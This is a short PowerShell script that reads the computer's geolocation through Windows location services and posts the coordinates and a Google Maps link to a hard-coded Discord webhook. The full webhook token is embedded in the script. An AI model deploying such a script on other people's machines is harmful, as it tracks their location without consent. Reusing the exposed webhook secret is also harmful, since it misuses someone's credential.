Add-Type -AssemblyName System.Device  # Required to access System.Device.Location namespace

# Create and start the GeoCoordinateWatcher
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()

# Wait until we have a fix or the user denies permission
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100
}

if ($GeoWatcher.Permission -eq 'Denied') {
    Write-Error 'Access Denied for Location Information'
    exit 1
}

# Grab the coordinates
$location = $GeoWatcher.Position.Location
$lat = $location.Latitude
$lon = $location.Longitude

# Your Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1385736055193600160/bYek8dVluPbkCuuntHuf_4V1_OaJeTy5Tw13GeeaKx8PJORL2WjzniYT-gah_gUwTR8M'

# Build a simple embed payload including a clickable Google Maps link
$mapUrl = "https://www.google.com/maps?q=$lat,$lon"
$payload = @{
    username   = 'GeoBot'
    avatar_url = 'https://i.imgur.com/4M34hi2.png'
    embeds     = @(
        @{
            title  = 'Current Location'
            url    = $mapUrl
            color  = 3447003
            fields = @(
                @{ name = 'Latitude';  value = "$lat";           inline = $true },
                @{ name = 'Longitude'; value = "$lon";           inline = $true },
                @{ name = 'Map';       value = "[View on Google Maps]($mapUrl)"; inline = $false }
            )
            footer = @{
                text = "Retrieved at $(Get-Date -Format u)"
            }
        }
    )
}

# Send to Discord
try {
    Invoke-RestMethod -Uri $webhookUrl `
                      -Method Post `
                      -Body ($payload | ConvertTo-Json -Depth 4) `
                      -ContentType 'application/json'
    Write-Host "Location + map link sent to Discord webhook."
}
catch {
    Write-Error "Failed to send webhook: $_"
}
